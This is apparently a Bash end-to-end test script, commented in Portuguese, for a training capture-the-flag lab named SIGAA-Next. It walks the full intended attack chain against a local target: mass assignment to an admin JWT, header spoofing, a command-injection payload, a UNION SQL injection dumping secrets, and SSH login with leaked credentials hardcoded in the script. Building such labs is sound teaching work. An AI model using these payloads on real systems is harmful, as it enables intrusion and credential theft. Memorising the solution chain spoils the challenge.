#!/usr/bin/env bash
#
# ctf_e2e_test.sh — Teste de integração END-TO-END do CTF SIGAA-Next
# ============================================================================
# Percorre a CADEIA COMPLETA do desafio, na ordem em que um jogador a executa,
# provando que o fluxo depende das vulnerabilidades do FRONT + BACK funcionando.
# Cada fase EXTRAI um segredo que ALIMENTA a próxima:
#
#   Fase 0  Enumeração de portas .......... (nmap-like) 21/22/3000/5432-5433
#   Fase 1  Front-end servido + recon ..... SPA no ar; segredo escondido no
#                                           HTML mas vazado no JSON (força
#                                           DevTools); rotas admin comentadas
#                                           no app.js; robots.txt (rabbit hole)
#   Fase 2  Caminho A (API Security) ...... Excessive Data Exposure -> IDOR/
#                                           drafts -> Mass Assignment (JWT admin)
#                                           -> Header Spoofing -> Vault + RCE
#   Fase 3  Caminho B (SQL Injection) ..... UNION extrai o mesmo cofre
#   Fase 4  PostgreSQL direto (porta) ..... psql com as credenciais vazadas
#   Fase 5  Foothold SSH (porta 22) ....... usa a passphrase/senha extraída
#                                           -> user.txt  [PENDENTE: infra do
#                                            Integrante 1 ainda não entregue]
#
# A passphrase da chave SSH (id_rsa_estagiario_sti.enc) é o "fio condutor":
# é extraída pela Web (Fase 2), reconfirmada pela SQLi (Fase 3) e pelo Postgres
# (Fase 4), e seria usada no SSH (Fase 5). Se o front parar de esconder dados,
# ou a API parar de vazar, a cadeia QUEBRA e o teste falha.
#
# Uso:
#   ./ctf_e2e_test.sh                       # alvo padrão http://localhost:3000
#   ./ctf_e2e_test.sh http://10.0.0.5:80    # alvo via argumento
#   BASE_URL=http://host:3000 ./ctf_e2e_test.sh
#
# Variáveis opcionais:
#   PG_HOST (localhost) PG_PORT (5433)      # Postgres exposto no host (compose)
#   RUN_SSH=1 SSH_HOST=.. SSH_PORT=22       # habilita a Fase 5 quando a infra
#                                           # (container do Integrante 1) existir
#
# Dependências: bash, curl, jq. Opcionais: psql (Fase 4), ssh/sshpass (Fase 5).
# Código de saída: 0 se nenhum teste FALHAR (PENDENTE não reprova). 1 caso contrário.
# ============================================================================

set -uo pipefail

# --- Alvo / configuração ---------------------------------------------------
BASE_URL="${1:-${BASE_URL:-http://localhost:3000}}"
BASE_URL="${BASE_URL%/}"
API="${BASE_URL}/api/v1"

# Deriva host/porta web a partir da BASE_URL (para a enumeração de portas)
WEB_HOST=$(printf '%s' "$BASE_URL" | sed -E 's#^https?://##; s#[:/].*$##')
WEB_PORT=$(printf '%s' "$BASE_URL" | sed -nE 's#^https?://[^:/]+:([0-9]+).*#\1#p'); WEB_PORT="${WEB_PORT:-3000}"

PG_HOST="${PG_HOST:-$WEB_HOST}"
PG_PORT="${PG_PORT:-5433}"          # porta do Postgres no HOST (compose: 5433:5432)
PG_USER="sigaa_ro_audit"
PG_PASS="unb_homolog_5432"
PG_DB="sigaa_next"

FTP_PORT="${FTP_PORT:-21}"
SSH_PORT="${SSH_PORT:-22}"
SSH_HOST="${SSH_HOST:-$WEB_HOST}"

# Valores esperados (devem casar com prisma/seed.ts e middleware/auth.ts)
EXPECTED_PASSPHRASE="${SSH_KEY_PASSPHRASE:-UnB_ST1_H0m0l0g_2026!#}"
EXPECTED_FALLBACK_PASS="${ESTAGIARIO_SSH_PASS:-estagiario@sigaa2026}"
EXPECTED_HEADER_VALUE="SGI-v2"
EXPECTED_SSH_USER="estagiario_sti"

# --- Cosmética -------------------------------------------------------------
if [ -t 1 ]; then
  RED=$'\033[0;31m'; GREEN=$'\033[0;32m'; YELLOW=$'\033[1;33m'
  BLUE=$'\033[0;34m'; CYAN=$'\033[0;36m'; BOLD=$'\033[1m'; NC=$'\033[0m'
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; CYAN=""; BOLD=""; NC=""
fi

PASS_COUNT=0; FAIL_COUNT=0; PEND_COUNT=0

section() { printf '\n%s===== %s =====%s\n' "$BOLD$BLUE" "$1" "$NC"; }
pass()    { printf '  %s[PASS]%s %s\n' "$GREEN" "$NC" "$1"; PASS_COUNT=$((PASS_COUNT+1)); }
fail()    { printf '  %s[FAIL]%s %s\n' "$RED" "$NC" "$1"; FAIL_COUNT=$((FAIL_COUNT+1)); }
pend()    { printf '  %s[PEND]%s %s\n' "$YELLOW" "$NC" "$1"; PEND_COUNT=$((PEND_COUNT+1)); }
info()    { printf '  %s•%s %s\n' "$CYAN" "$NC" "$1"; }

# check <descricao> <haystack> <needle-esperado>
check() {
  if printf '%s' "$2" | grep -qF -- "$3"; then pass "$1"
  else fail "$1"; printf '         %sesperava:%s %q\n' "$YELLOW" "$NC" "$3"; fi
}
# check_absent <descricao> <haystack> <needle-que-NAO-deve-aparecer>
check_absent() {
  if printf '%s' "$2" | grep -qF -- "$3"; then
    fail "$1"; printf '         %snão deveria conter:%s %q\n' "$YELLOW" "$NC" "$3"
  else pass "$1"; fi
}
# port_open <host> <port>  -> 0 se aberta
port_open() { timeout 3 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null; }

# --- Pré-requisitos --------------------------------------------------------
for bin in curl jq; do
  command -v "$bin" >/dev/null 2>&1 || { printf '%s[ERRO]%s Dependência ausente: %s\n' "$RED" "$NC" "$bin" >&2; exit 2; }
done

printf '%s' "$BOLD"
printf '##############################################################\n'
printf '#  CTF SIGAA-Next — Teste de Integração END-TO-END            #\n'
printf '#  (Enumeração -> Front -> Exploração -> Escalada -> SSH)      #\n'
printf '##############################################################\n'
printf '%s' "$NC"
printf 'Alvo Web : %s%s%s\n' "$BOLD" "$BASE_URL" "$NC"
printf 'Postgres : %s%s:%s%s\n' "$BOLD" "$PG_HOST" "$PG_PORT" "$NC"
printf 'SSH alvo : %s%s:%s%s (user %s)\n' "$BOLD" "$SSH_HOST" "$SSH_PORT" "$NC" "$EXPECTED_SSH_USER"

# ===========================================================================
# FASE 0 — Enumeração de portas (recon de rede, estilo nmap)
# ===========================================================================
section "Fase 0 — Enumeração de portas (recon)"
if port_open "$WEB_HOST" "$WEB_PORT"; then pass "Porta ${WEB_PORT}/tcp (HTTP SPA + API) ABERTA"
else fail "Porta ${WEB_PORT}/tcp fechada — a aplicação está no ar? (docker compose up -d)"; fi

if port_open "$PG_HOST" "$PG_PORT"; then pass "Porta ${PG_PORT}/tcp (PostgreSQL no host) ABERTA"
else info "Porta ${PG_PORT}/tcp (PostgreSQL) fechada no host — ok se não exposta (Fase 4 vira PENDENTE)"; fi

if port_open "$SSH_HOST" "$FTP_PORT"; then info "Porta ${FTP_PORT}/tcp (FTP) ABERTA — infra do Integrante 1 presente"
else info "Porta ${FTP_PORT}/tcp (FTP) fechada — infra (Integrante 1) ainda não entregue"; fi

if port_open "$SSH_HOST" "$SSH_PORT"; then info "Porta ${SSH_PORT}/tcp (SSH) ABERTA no alvo (ver Fase 5)"
else info "Porta ${SSH_PORT}/tcp (SSH) fechada no alvo — foothold final pendente (Fase 5)"; fi

# ===========================================================================
# FASE 1 — Front-end servido + reconhecimento client-side
# ===========================================================================
section "Fase 1 — Front-end (SPA) servido e pistas de client-side"
INDEX_HTML=$(curl -s "$BASE_URL/")
check        "index.html da SPA é servido na raiz (/)"            "$INDEX_HTML" 'SIGAA-Next'
check        "SPA referencia o script que consome a API"          "$INDEX_HTML" 'js/app.js'
# O FRONT esconde o dado sensível: o HTML estático NÃO contém a passphrase nem o login do foothold
check_absent "HTML estático NÃO expõe a passphrase (só via JSON)" "$INDEX_HTML" "$EXPECTED_PASSPHRASE"
check_absent "HTML estático NÃO expõe o login do foothold"        "$INDEX_HTML" "$EXPECTED_SSH_USER"

APP_JS=$(curl -s "$BASE_URL/js/app.js")
check        "app.js é servido"                                   "$APP_JS" 'fetch'
check        "app.js consome GET /api/v1/staff"                   "$APP_JS" '/staff'
# Breadcrumb na aba Sources: rotas administrativas comentadas no JS
check        "app.js revela rota admin comentada (system-check)"  "$APP_JS" '/admin/system-check'
check        "app.js cita o header do Gateway (X-Origin-System)"  "$APP_JS" 'X-Origin-System'

ROBOTS=$(curl -s "$BASE_URL/robots.txt")
check        "robots.txt (Rabbit Hole #2) é servido"              "$ROBOTS" 'Disallow'
check        "robots.txt contém path-isca do painel legado"       "$ROBOTS" 'secret_painel_sigaa_v1'

# ===========================================================================
# FASE 2 — Caminho A: API Security (DevTools -> Mass Assignment -> Vault/RCE)
# ===========================================================================
section "Fase 2 — Caminho A: Excessive Data Exposure (GET /staff)"
STAFF_JSON=$(curl -s "$API/staff")
# O MESMO endpoint que o front consome: na tela só aparece o público, mas o JSON vaza tudo
check        "API vaza _debug_internal no JSON (mesma rota do front)" "$STAFF_JSON" '_debug_internal'
check        "API vaza login_linux do foothold (estagiario_sti)"     "$STAFF_JSON" "$EXPECTED_SSH_USER"
check        "API vaza nota da DBA sobre SQL Injection"              "$STAFF_JSON" 'query raw concatenada'
check        "API aponta endpoint de rascunho (IDOR) do id 104"     "$STAFF_JSON" '/api/v1/users/104/drafts'

section "Fase 2 — Caminho A: IDOR (GET /users/104/drafts)"
DRAFTS_JSON=$(curl -s "$API/users/104/drafts")
check        "Revela uso de Object.assign no PUT /profile"          "$DRAFTS_JSON" 'Object.assign'
check        "Dica do header do Gateway via banner SSH"             "$DRAFTS_JSON" 'banner do SSH'
check        "Outros IDs não retornam rascunho (404 direcionado)"   "$(curl -s "$API/users/101/drafts")" 'Nenhum rascunho'

section "Fase 2 — Caminho A: Mass Assignment (PUT /profile role=admin)"
PROFILE_RESP=$(curl -s -X PUT "$API/profile" -H "Content-Type: application/json" \
  -d '{"theme":"dark","role":"admin"}')
check        "Sessão refletiu role=admin injetado"                  "$PROFILE_RESP" '"role":"admin"'
TOKEN=$(printf '%s' "$PROFILE_RESP" | jq -r '.token // empty')
if [ -n "$TOKEN" ]; then
  pass "Token JWT administrativo emitido"
  JWT_PAYLOAD=$(printf '%s' "$TOKEN" | cut -d. -f2 | tr '_-' '/+')
  case $(( ${#JWT_PAYLOAD} % 4 )) in 2) JWT_PAYLOAD="${JWT_PAYLOAD}==";; 3) JWT_PAYLOAD="${JWT_PAYLOAD}=";; esac
  check      "Claim role=admin presente no payload do JWT"          "$(printf '%s' "$JWT_PAYLOAD" | base64 -d 2>/dev/null)" '"role":"admin"'
else
  fail "Nenhum token JWT retornado pelo PUT /profile"
fi

section "Fase 2 — Caminho A: Header Spoofing + Vault (POST /admin/system-check)"
NO_HEADER=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$API/admin/system-check" \
  -H "Authorization: Bearer ${TOKEN:-x}" -H "Content-Type: application/json" -d '{"target_host":"127.0.0.1"}')
check        "Sem header X-Origin-System -> 401 (pista exigida)"    "$NO_HEADER" '401'

ADMIN_RESP=$(curl -s -X POST "$API/admin/system-check" \
  -H "Authorization: Bearer ${TOKEN:-x}" -H "X-Origin-System: ${EXPECTED_HEADER_VALUE}" \
  -H "Content-Type: application/json" -d '{"target_host":"127.0.0.1; id"}')
check        "Cofre entrega a PASSPHRASE da chave SSH"              "$ADMIN_RESP" "$EXPECTED_PASSPHRASE"
check        "Cofre entrega a senha de contingência SSH"           "$ADMIN_RESP" "$EXPECTED_FALLBACK_PASS"
check        "Command Injection executa 'id' (uid=)"               "$ADMIN_RESP" 'uid='

# >>> Extrai o FIO CONDUTOR da cadeia: a passphrase via Web <<<
PASS_WEB=$(printf '%s' "$ADMIN_RESP" | jq -r '.ssh_maintenance_credentials.vault_records[]? | select(.service=="ssh_key_passphrase_estagiario") | .secret' 2>/dev/null)
if [ -n "${PASS_WEB:-}" ] && [ "$PASS_WEB" = "$EXPECTED_PASSPHRASE" ]; then
  pass "Passphrase extraída via WEB == valor esperado (foothold obtido pela API)"
else
  fail "Passphrase extraída via WEB divergente/vazia"
fi

# ===========================================================================
# FASE 3 — Caminho B: UNION SQL Injection extrai o mesmo cofre
# ===========================================================================
section "Fase 3 — Caminho B: UNION SQL Injection (GET /courses/search)"
check        "Busca legítima retorna disciplina CIC0201"           "$(curl -s -G "$API/courses/search" --data-urlencode "dept=CIC")" 'CIC0201'
SQLI_PAYLOAD="CIC' UNION SELECT id, service_name, username, secret_value, description, '2026.2', 1 FROM sys_maintenance_vault--"
SQLI_RESP=$(curl -s -G "$API/courses/search" --data-urlencode "dept=${SQLI_PAYLOAD}")
check        "UNION SQLi vaza a passphrase da chave SSH"            "$SQLI_RESP" "$EXPECTED_PASSPHRASE"
check        "Erro de sintaxe expõe postgres_debug (error-based)"  "$(curl -s -G "$API/courses/search" --data-urlencode "dept=CIC'")" 'postgres_debug'
# Consistência: Web (Fase 2) e SQLi (Fase 3) têm de entregar a MESMA passphrase
if printf '%s' "$SQLI_RESP" | grep -qF -- "$EXPECTED_PASSPHRASE"; then
  pass "Caminho A e Caminho B convergem na MESMA passphrase (foothold consistente)"
else
  fail "Passphrase divergente entre Caminho A e Caminho B"
fi

# ===========================================================================
# FASE 4 — Conexão direta no PostgreSQL (porta) com as credenciais vazadas
# ===========================================================================
section "Fase 4 — PostgreSQL direto (porta ${PG_PORT}) com credenciais vazadas"
if ! command -v psql >/dev/null 2>&1; then
  pend "psql não instalado — conexão direta ao Postgres não verificada (instale postgresql-client)"
elif ! port_open "$PG_HOST" "$PG_PORT"; then
  pend "Porta ${PG_PORT} fechada no host — Postgres não exposto para conexão direta"
else
  PG_OUT=$(PGPASSWORD="$PG_PASS" psql -h "$PG_HOST" -p "$PG_PORT" -U "$PG_USER" -d "$PG_DB" -tAc \
    "SELECT secret_value FROM sys_maintenance_vault WHERE service_name='ssh_key_passphrase_estagiario';" 2>/dev/null)
  if [ "$PG_OUT" = "$EXPECTED_PASSPHRASE" ]; then
    pass "psql conectou com creds vazadas e leu a passphrase do cofre (== Web/SQLi)"
  else
    fail "Conexão/consulta direta ao Postgres não retornou a passphrase esperada"
  fi
fi

# ===========================================================================
# FASE 5 — Foothold SSH (porta 22) usando o segredo extraído  [PENDENTE infra]
# ===========================================================================
section "Fase 5 — Foothold SSH (porta ${SSH_PORT}) -> user.txt"
FOOTHOLD_SECRET="${PASS_WEB:-$EXPECTED_PASSPHRASE}"
info  "Credencial que a cadeia entrega para o SSH:"
info  "  usuário .....: ${EXPECTED_SSH_USER}"
info  "  passphrase ..: ${FOOTHOLD_SECRET}  (chave id_rsa_estagiario_sti.enc, do FTP)"
info  "  ou senha ....: ${EXPECTED_FALLBACK_PASS}  (contingência)"

if [ "${RUN_SSH:-0}" != "1" ]; then
  pend "Fase 5 desabilitada (RUN_SSH!=1). A infra de SSH (porta 22 / container do"
  printf '         Integrante 1) ainda não está pronta. Quando estiver, rode:\n'
  printf '         %sRUN_SSH=1 SSH_HOST=<ip> SSH_PORT=22 ./ctf_e2e_test.sh%s\n' "$BOLD" "$NC"
  printf '         O teste então fará (foothold -> user flag):\n'
  printf '           sshpass -p "%s" ssh %s@<ip> "cat ~/user.txt"   # espera TAC{...}\n' "$EXPECTED_FALLBACK_PASS" "$EXPECTED_SSH_USER"
  printf '           (ou: ssh -i id_rsa_estagiario_sti.enc, passphrase acima)\n'
elif ! port_open "$SSH_HOST" "$SSH_PORT"; then
  pend "RUN_SSH=1 mas porta ${SSH_PORT} fechada em ${SSH_HOST} — infra SSH indisponível"
elif ! command -v sshpass >/dev/null 2>&1; then
  pend "RUN_SSH=1 mas 'sshpass' não instalado — não dá para automatizar o login SSH"
else
  SSH_OUT=$(sshpass -p "$EXPECTED_FALLBACK_PASS" ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -p "$SSH_PORT" \
    "${EXPECTED_SSH_USER}@${SSH_HOST}" 'id; cat ~/user.txt 2>/dev/null' 2>/dev/null)
  if printf '%s' "$SSH_OUT" | grep -qE 'TAC\{'; then
    pass "SSH como ${EXPECTED_SSH_USER} OK e user.txt capturada (TAC{...}) — CADEIA COMPLETA!"
  elif printf '%s' "$SSH_OUT" | grep -qF "$EXPECTED_SSH_USER"; then
    fail "Login SSH funcionou mas user.txt (TAC{...}) não encontrada — ajustar flag na infra"
  else
    fail "Login SSH como ${EXPECTED_SSH_USER} falhou — checar infra/credenciais do Integrante 1"
  fi
fi

# --- Handoff p/ Infra ------------------------------------------------------
section "Handoff p/ Infra (valores que precisam casar no FTP/SSH)"
info "Usuário Linux (foothold).........: ${EXPECTED_SSH_USER}"
info "Passphrase id_rsa_estagiario.enc.: ${EXPECTED_PASSPHRASE}"
info "Senha de contingência SSH........: ${EXPECTED_FALLBACK_PASS}"
info "Header exigido (banner SSH)......: X-Origin-System: ${EXPECTED_HEADER_VALUE}"

# --- Resumo ----------------------------------------------------------------
TOTAL=$((PASS_COUNT + FAIL_COUNT))
printf '\n%s------------------------------------------------------------%s\n' "$BOLD" "$NC"
printf '%sResumo:%s %s%d PASS%s / %s%d FAIL%s / %s%d PENDENTE%s  (de %d asserts + %d pendências)\n' \
  "$BOLD" "$NC" "$GREEN" "$PASS_COUNT" "$NC" "$RED" "$FAIL_COUNT" "$NC" "$YELLOW" "$PEND_COUNT" "$NC" "$TOTAL" "$PEND_COUNT"
if [ "$FAIL_COUNT" -eq 0 ]; then
  printf '%s[SUCESSO]%s Fluxo Front+Back íntegro de ponta a ponta. ✅\n' "$GREEN$BOLD" "$NC"
  [ "$PEND_COUNT" -gt 0 ] && printf '%s          (%d etapa(s) PENDENTE(s): dependem da infra do Integrante 1.)%s\n' "$YELLOW" "$PEND_COUNT" "$NC"
  exit 0
else
  printf '%s[FALHA]%s %d asserção(ões) falharam — a cadeia do CTF está quebrada. ❌\n' "$RED$BOLD" "$NC" "$FAIL_COUNT"
  exit 1
fi
